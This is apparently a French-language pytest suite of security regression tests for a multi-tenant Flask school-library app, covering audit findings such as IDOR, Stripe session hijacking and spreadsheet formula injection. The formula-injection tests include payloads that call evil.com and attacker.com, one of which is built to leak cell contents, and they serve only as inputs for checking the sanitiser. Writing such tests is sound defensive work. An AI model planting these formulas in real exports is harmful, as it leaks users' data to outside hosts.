import io
import json
import logging
import time
from unittest.mock import patch

import openpyxl
import pytest

from project import create_app, db
from project.export import sanitize_excel_cell
from project.models import Book, Loan, Student, User


@pytest.fixture
def sec_app():
    app = create_app(
        {
            "TESTING": True,
            "WTF_CSRF_ENABLED": False,
            "SQLALCHEMY_DATABASE_URI": "sqlite:///:memory:",
            "SECRET_KEY": "test-sec-secret-key-12345",
        }
    )
    with app.app_context():
        db.create_all()
        # Création de deux utilisateurs distincts (multi-tenant)
        user_a = User(
            id=1,
            email="user_a@test.com",
            password="hash_password_a",
            plan="premium",
            stripe_subscription_status="active",
        )
        user_b = User(
            id=2, email="user_b@test.com", password="hash_password_b", plan="free"
        )
        db.session.add_all([user_a, user_b])
        db.session.commit()

        # Livres
        book_a = Book(id=10, title="Livre de A", author="Auteur A", user_id=1)
        book_b = Book(id=20, title="Livre de B", author="Auteur B", user_id=2)
        db.session.add_all([book_a, book_b])

        # Élèves
        student_a = Student(id=100, name="EleveA", firstname="Alice", user_id=1)
        student_b = Student(id=200, name="EleveB", firstname="Bob", user_id=2)
        db.session.add_all([student_a, student_b])

        # Emprunt sur le livre de B
        loan_b = Loan(id=500, book_id=20, student_id=200)
        db.session.add(loan_b)
        db.session.commit()

        yield app
        db.drop_all()


@pytest.fixture
def sec_client(sec_app):
    return sec_app.test_client()


# ==============================================================================
# FND-05 : IDOR sur POST /livre/<id>/edit-student
# ==============================================================================
def test_fnd_05_cross_tenant_idor_edit_student_prevented(sec_client, sec_app):
    """Vérifie qu'un enseignant ne peut pas prêter un livre appartenant à un autre enseignant."""
    with sec_app.app_context():
        user_a = db.session.get(User, 1)

        with sec_client.session_transaction() as sess:
            sess["_user_id"] = str(user_a.id)

        # User A tente de prêter le livre ID 20 (qui appartient à User B) à son élève 100
        resp = sec_client.post(
            "/fr/livre/20/edit-student",
            data={"student_id": 100},
            follow_redirects=False,
        )
        assert resp.status_code == 302
        assert "/livre" in resp.headers.get("Location", "")

        # Vérifier qu'aucun prêt n'a été créé sur le livre 20 pour l'élève 100
        unauthorized_loan = Loan.query.filter_by(book_id=20, student_id=100).first()
        assert unauthorized_loan is None


# ==============================================================================
# FND-08 : Détournement de session Stripe Checkout (/subscription/success)
# ==============================================================================
def test_fnd_08_stripe_success_session_hijacking_prevented(sec_client, sec_app):
    """Vérifie qu'un utilisateur ne peut pas s'approprier la session Stripe d'un tiers."""
    with sec_app.app_context():
        user_b = db.session.get(User, 2)  # Compte 'free'

        with sec_client.session_transaction() as sess:
            sess["_user_id"] = str(user_b.id)

        # Mock de session Stripe appartenant à User 1 (autre utilisateur)
        fake_stripe_session = {
            "client_reference_id": "1",
            "metadata": {"user_id": "1", "plan_type": "price_monthly"},
            "payment_status": "paid",
            "customer": "cus_victim_123",
            "subscription": "sub_victim_456",
        }

        with (
            patch("stripe.checkout.Session.retrieve", return_value=fake_stripe_session),
            patch.dict("os.environ", {"STRIPE_SECRET_KEY": "sk_test_fake"}),
        ):
            resp = sec_client.get(
                "/subscription/success?session_id=cs_victim_session",
                follow_redirects=False,
            )
            # Doit être redirigé vers le tableau de bord avec rejet
            assert resp.status_code == 302
            assert "/dashboard" in resp.headers.get("Location", "")

            # Le compte de User B doit rester en 'free'
            db.session.refresh(user_b)
            assert user_b.plan == "free"
            assert user_b.stripe_customer_id is None


# ==============================================================================
# FND-09 : Fail-closed sur /webhook/stripe si secret non configuré
# ==============================================================================
def test_fnd_09_stripe_webhook_unconfigured_secret_fails_closed(sec_client, sec_app):
    """Vérifie que /webhook/stripe rejette avec HTTP 500 si STRIPE_WEBHOOK_SECRET est absent."""
    original_testing = sec_app.config.get("TESTING")
    try:
        sec_app.config["TESTING"] = False
        with patch.dict("os.environ", {"STRIPE_WEBHOOK_SECRET": ""}):
            resp = sec_client.post(
                "/webhook/stripe",
                data=json.dumps({"type": "checkout.session.completed"}),
                content_type="application/json",
            )
            assert resp.status_code == 500
            assert resp.get_json().get("error") == "Webhook secret not configured"
    finally:
        sec_app.config["TESTING"] = original_testing


# ==============================================================================
# FND-03 : CSV/Excel Formula Injection Sanitization
# ==============================================================================
def test_fnd_03_sanitize_excel_cell_utility():
    """Vérifie le bon échappement des formules selon la recommandation OWASP."""
    assert (
        sanitize_excel_cell('=HYPERLINK("http://evil.com")')
        == '\'=HYPERLINK("http://evil.com")'
    )
    assert sanitize_excel_cell("+12345") == "'+12345"
    assert sanitize_excel_cell("-10") == "'-10"
    assert sanitize_excel_cell("@SUM(A1:A5)") == "'@SUM(A1:A5)"
    assert sanitize_excel_cell("\tcommand") == "'\tcommand"
    assert sanitize_excel_cell("\rcommand") == "'\rcommand"
    assert sanitize_excel_cell("Le Petit Prince") == "Le Petit Prince"
    assert sanitize_excel_cell(42) == 42
    assert sanitize_excel_cell(None) is None


def test_fnd_03_export_books_escapes_formulas(sec_client, sec_app):
    """Vérifie que l'export Excel désamorce les titres contenant des formules."""
    with sec_app.app_context():
        user_a = db.session.get(User, 1)
        # Création d'un livre piégé avec une formule
        formula_book = Book(
            title='=HYPERLINK("http://attacker.com/leak?data="&A1, "Livre")',
            author="+MaliciousAuthor",
            user_id=1,
        )
        db.session.add(formula_book)
        db.session.commit()

        with sec_client.session_transaction() as sess:
            sess["_user_id"] = str(user_a.id)

        resp = sec_client.get("/fr/export/books")
        assert resp.status_code == 200

        wb = openpyxl.load_workbook(io.BytesIO(resp.data))
        ws = wb.active
        # Vérifie que les cellules commençant par = ou + sont préfixées par '
        titles = [row[0] for row in ws.iter_rows(values_only=True)]
        authors = [row[1] for row in ws.iter_rows(values_only=True)]

        assert any(t and str(t).startswith("'=") for t in titles)
        assert any(a and str(a).startswith("'+") for a in authors)


# ==============================================================================
# FND-02 : Expiration des tokens de désinscription newsletter (max_age)
# ==============================================================================
def test_fnd_02_unsubscribe_token_expiration(sec_app):
    """Vérifie que les tokens de désinscription expirent après 30 jours."""
    with sec_app.app_context():
        user = db.session.get(User, 1)
        token = user.get_unsubscribe_token()

        # Immédiatement valide
        validated = User.validate_unsubscribe_token(token, user.id)
        assert validated is not None
        assert validated.id == user.id

        # Simuler un token vieux de 31 jours
        with patch("time.time", return_value=time.time() + (31 * 86400)):
            expired = User.validate_unsubscribe_token(token, user.id)
            assert expired is None


# ==============================================================================
# FND-06 : Anti-oracle et isolation des emprunts tiers
# ==============================================================================
def test_fnd_06_return_quick_oracle_eliminated(sec_client, sec_app):
    """Vérifie que retourner un emprunt tiers retourne 404 uniforme (identique à non existant)."""
    with sec_app.app_context():
        user_a = db.session.get(User, 1)

        with sec_client.session_transaction() as sess:
            sess["_user_id"] = str(user_a.id)

        # Emprunt ID 500 appartient à User B (Livre ID 20)
        # Requête JSON sur l'emprunt tiers -> 404
        resp_tier = sec_client.post(
            "/emprunt/500/return-quick",
            headers={"Accept": "application/json"},
        )
        assert resp_tier.status_code == 404
        assert resp_tier.get_json().get("error") == "Emprunt introuvable."

        # Requête JSON sur un ID inexistant -> 404 identique
        resp_nonexistent = sec_client.post(
            "/emprunt/999999/return-quick",
            headers={"Accept": "application/json"},
        )
        assert resp_nonexistent.status_code == 404
        assert resp_nonexistent.get_json().get("error") == "Emprunt introuvable."


def test_fnd_06_delete_loan_cross_tenant_prevented(sec_client, sec_app):
    """Vérifie que supprimer l'emprunt d'un tiers est rejeté avec 'Emprunt introuvable.'."""
    with sec_app.app_context():
        user_a = db.session.get(User, 1)

        with sec_client.session_transaction() as sess:
            sess["_user_id"] = str(user_a.id)

        resp = sec_client.post(
            "/emprunt/500/delete",
            follow_redirects=False,
        )
        assert resp.status_code == 302

        # L'emprunt de B existe toujours
        loan = db.session.get(Loan, 500)
        assert loan is not None


# ==============================================================================
# FND-01 : Défense en profondeur sur /admin via en-têtes Authelia
# ==============================================================================
def test_fnd_01_admin_authelia_header_guard(sec_client, sec_app):
    """Vérifie que hors TESTING/DEBUG, /admin exige les en-têtes Authelia."""
    original_testing = sec_app.config.get("TESTING")
    original_debug = sec_app.debug
    try:
        sec_app.config["TESTING"] = False
        sec_app.debug = False

        # 1. Requête sans en-tête Authelia -> 403 Forbidden
        resp_no_header = sec_client.get("/fr/admin")
        assert resp_no_header.status_code == 403

        # 2. Requête avec en-tête Remote-User -> 200 OK
        resp_authelia = sec_client.get(
            "/fr/admin",
            headers={"Remote-User": "admin_authelia"},
        )
        assert resp_authelia.status_code == 200

        # 3. Requête avec en-tête Remote-Email -> 200 OK
        resp_email = sec_client.get(
            "/fr/admin",
            headers={"Remote-Email": "admin@livresenclasse.com"},
        )
        assert resp_email.status_code == 200
    finally:
        sec_app.config["TESTING"] = original_testing
        sec_app.debug = original_debug


# ==============================================================================
# FND-07 : Fail-fast de SECRET_KEY en production
# ==============================================================================
def test_fnd_07_secret_key_production_fail_fast():
    """Vérifie que FLASK_ENV=production refuse la SECRET_KEY par défaut ou vide."""
    with patch.dict(
        "os.environ", {"FLASK_ENV": "production", "SECRET_KEY": "dev-secret-key"}
    ):
        with pytest.raises(RuntimeError) as exc_info:
            create_app({"TESTING": False})
        assert "SECRET_KEY doit obligatoirement être configuré" in str(exc_info.value)

    with patch.dict("os.environ", {"FLASK_ENV": "production", "SECRET_KEY": ""}):
        with pytest.raises(RuntimeError) as exc_info:
            create_app({"TESTING": False})
        assert "SECRET_KEY doit obligatoirement être configuré" in str(exc_info.value)


# ==============================================================================
# FND-04 : Avertissement anti-bot hCaptcha en production
# ==============================================================================
def test_fnd_04_hcaptcha_production_warning(caplog):
    """Vérifie qu'un log d'avertissement est émis en production si HCAPTCHA_SECRET_KEY est absent."""
    with (
        patch.dict(
            "os.environ",
            {
                "FLASK_ENV": "production",
                "SECRET_KEY": "a-very-strong-and-secure-production-secret-key",
                "HCAPTCHA_SECRET_KEY": "",
            },
        ),
        caplog.at_level(logging.WARNING),
    ):
        app = create_app({"TESTING": False})
        assert app is not None
        assert any(
            "HCAPTCHA_SECRET_KEY non configuré en production" in record.message
            for record in caplog.records
        )
